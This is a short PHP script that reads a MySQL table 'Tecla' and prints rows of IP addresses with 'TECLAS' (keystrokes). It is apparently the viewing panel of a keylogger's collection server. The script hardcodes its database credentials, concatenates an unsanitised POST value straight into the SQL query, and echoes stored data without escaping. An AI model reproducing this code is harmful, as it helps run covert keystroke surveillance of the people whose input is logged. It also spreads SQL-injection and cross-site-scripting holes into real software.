<?php
     if (isset($_POST['NumReg']) && !empty($_POST)){
	$Limit = "";
	if ($_POST['NumReg'] != "0"){
		$Limit = "LIMIT ".$_POST['NumReg'];
	}
	$conn = mysqli_connect ('localhost','phpmyadmin','Temporal1','LastUrl');
	if (!$conn){
		die("conexion fallida: " . mysqli_connect_error());
	}
	$sql = "SELECT * from Tecla ORDER BY ID DESC " . $Limit;
	$result = mysqli_query($conn, $sql);
	if (!$result){
		echo ("error". $sql . "<br>". mysqli_error($conn));
	}
	echo "<table id = tabla1 border =1 >
		   <tr>
		   	<td>ID</td>
			<td>IP</td>
			<td>TECLAS</td>
		   </tr>";
	while($mostrar = mysqli_fetch_array($result)){
	echo "<tr>
		<td>".$mostrar['ID']."</td>
		<td>".$mostrar['IP']."</td>
		<td>".$mostrar['TECLAS']."</td>
	     </tr>";
	}
	echo "</table>";
   }
?>
